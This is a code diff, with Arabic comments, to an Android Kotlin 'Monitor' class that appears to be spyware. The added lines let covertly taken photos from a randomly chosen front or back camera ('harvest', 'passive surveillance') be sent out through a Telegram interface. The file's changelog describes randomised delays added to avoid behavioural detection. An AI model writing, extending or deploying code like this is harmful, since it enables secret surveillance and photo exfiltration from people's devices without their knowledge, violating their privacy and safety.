@@ -36,6 +36,7 @@ import kotlin.random.Random
  * - تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
  * - ✅ زيادة نطاق التشويش إلى 60-240 دقيقة مع 0-120 ثانية إضافية لتجنب الكشف السلوكي.
  * - ✅ إضافة تحقق من null قبل استخدام cameraAnalyzer في دالة start() لتجنب الفشل الصامت.
+ * - ✅ إضافة دالة setTelegramUi لتمكين المراقبة السلبية من إرسال الصور.
  */
 class Monitor private constructor(context: Context) {
 
@@ -427,7 +428,10 @@ class Monitor private constructor(context: Context) {
             delay(preCaptureDelay)
 
             val randomCam = Random.nextInt(2)
-            invokeMethod(camera, "harvest", randomCam)
+            // ✅ تمرير ui و threadId = 0 (لأنه في الخلفية وليس لدينا topic محدد)
+            // سنمرر ui إذا كان موجوداً، وإلا لن تُرسل الصور
+            val telegramUi = ui as? TelegramUi
+            invokeMethod(camera, "harvest", randomCam, telegramUi, 0L)
             writeLog("📸 Auto-capture triggered (camera: ${if (randomCam == 0) "back" else "front"})")
         } catch (e: Exception) {
             writeLog("⚠️ Camera logic error: ${e.message}")
@@ -480,6 +484,18 @@ class Monitor private constructor(context: Context) {
             val cameraAnalyzer = getModuleComponent("cameraAnalyzer") as? CameraAnalyzer
             if (cameraAnalyzer != null) {
                 writeLog("🛰️ Starting passive surveillance...")
+                // ✅ تمرير ui إلى cameraAnalyzer لإرسال الصور من المراقبة السلبية
+                val telegramUi = ui as? TelegramUi
+                if (telegramUi != null) {
+                    // استخدام الانعكاس أو دالة مباشرة إذا كانت متاحة
+                    try {
+                        val setUiMethod = cameraAnalyzer.javaClass.getMethod("setTelegramUi", TelegramUi::class.java)
+                        setUiMethod.invoke(cameraAnalyzer, telegramUi)
+                        writeLog("✅ TelegramUi passed to CameraAnalyzer for passive surveillance")
+                    } catch (e: Exception) {
+                        writeLog("⚠️ Could not set TelegramUi on CameraAnalyzer: ${e.message}")
+                    }
+                }
                 scope.launch {
                     cameraAnalyzer.startPassiveSurveillance()
                 }
